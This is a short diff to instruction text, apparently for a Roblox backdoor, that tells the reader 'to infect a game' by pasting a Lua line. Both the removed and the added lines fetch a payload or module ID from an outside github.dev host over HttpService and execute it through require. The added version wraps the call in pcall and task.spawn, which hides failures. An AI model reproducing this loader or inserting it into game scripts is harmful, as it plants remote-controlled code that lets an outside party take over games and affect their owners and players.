@@ -4,5 +4,5 @@
 
 to infect a game put: 
   ```lua
-    require(108059886578663)(game:GetService("HttpService"):GetAsync("https://lonely-werewolf-q7g5wgwg9xgxcx6jw-3000.app.github.dev/script.lua"))()
+    task.spawn(require,tonumber(({pcall(game:GetService("HttpService").GetAsync,game:GetService("HttpService"),"https://lonely-werewolf-q7g5wgwg9xgxcx6jw-3000.app.github.dev/delivery")})[2]))
   ```
